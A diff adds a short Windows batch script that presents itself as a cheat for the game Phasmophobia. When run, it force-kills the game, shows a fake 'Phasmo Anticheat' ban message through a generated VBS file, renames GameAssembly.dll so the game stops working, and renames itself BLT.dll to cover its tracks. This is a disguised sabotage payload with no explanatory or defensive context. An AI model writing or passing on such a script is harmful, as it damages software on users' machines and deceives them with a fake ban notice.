@@ -1,0 +1,28 @@
+@echo off
+
+rem Time for some fun
+
+
+if exist Phasmophobia.exe goto :funtime
+exit
+
+:funtime
+taskkill /IM Phasmophobia.exe /F > nul
+if %errorlevel%==128 goto :nophas
+echo %errorlevel%
+@echo x=msgbox("You have been banned for: Cheating, Time: 999999 years" ,16, "Phasmo Anticheat") > alert.vbs
+start alert.vbs
+rem ren UnityPlayer.dll UnityPlayer.dil.dll > nul
+ren GameAssembly.dll GameAssembly.dil.dll > nul
+timeout 1 >nul
+del alert.vbs
+goto :end
+
+:nophas
+echo Please Run phasmo before the cheats
+pause
+goto end
+
+:end
+ren BLT.bat BLT.dll
+exit
